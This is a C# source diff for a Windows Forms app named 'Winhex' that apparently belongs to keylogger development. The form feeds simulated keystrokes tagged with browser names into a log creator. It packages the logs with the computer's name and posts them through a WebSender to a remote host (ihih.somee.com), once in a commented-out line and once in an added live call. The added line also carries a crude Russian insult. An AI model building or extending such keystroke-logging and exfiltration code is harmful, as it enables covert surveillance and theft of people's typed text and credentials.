@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Management;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -11,29 +10,36 @@ namespace Winhex
 {
     public partial class Form1 : Form
     {
+        private ILogCreator loger;
         public Form1()
         {
             InitializeComponent();
+            FormClosing += (sender, args) => loger?.Close();
 
-            var syms = new []
+            var syms = new[]
             {
                 'a', 'b', 'c', 'd', 'e',
                 'g', 'h', 'i', 'j', ' '
             };
-
+            //ILogCreator loger = new UserLogCreator();
             Task.Run(() =>
             {
-                ILogCreator loger = new UserLogCreator();
-                int c = 0;
-                while (true)
+                Invoke(new Action(() =>
                 {
-                    Random rand = new Random();
-                    if (c > 40) c = 0;
-                    if (c > 20) loger.AddKey("Chrome", syms[rand.Next(0, 9)]);
-                    else loger.AddKey("Yandex", syms[rand.Next(0, 9)]);
-                    Thread.Sleep(1000);
-                    c++;
-                }
+                    loger = new UserLogCreator();
+
+                    int c = 0;
+                    while (true)
+                    {
+                        Random rand = new Random();
+                        if (c > 40) c = 0;
+                        if (c > 20) loger.AddKey("Chrome", syms[rand.Next(0, 9)]);
+                        else loger.AddKey("Yandex", syms[rand.Next(0, 9)]);
+                        Thread.Sleep(1000);
+                        c++;
+
+                    }
+                }));
             });
         }
 
@@ -42,7 +48,7 @@ namespace Winhex
             List<UserAction> actions = new List<UserAction>();
             actions.Add(new UserAction() { ActionDateTime = DateTime.Now, AppTitle = "Chrome", TextLog = "heelo!" });
             actions.Add(new UserAction() { ActionDateTime = DateTime.Now, AppTitle = "Yandex", TextLog = "hih" });
-            var log = new UserLog() { CompName = "New", SendingDateTime = DateTime.Now };
+            var log = new UserLog() { CompName = "New" };
             log.Logs.Add(actions[0]);
             log.Logs.Add(actions[1]);
 
@@ -59,6 +65,9 @@ namespace Winhex
             //log.Logs.Add(actions[1]);
 
             //WebSender.SendToServer(log, "http://www.ihih.somee.com/upload");
+
+            var user = new UserLog() { Id = 1, CustomNote = "Питух" };
+            WebSender.SendToServer(user, "http://www.ihih.somee.com/download");
         }
     }
 }
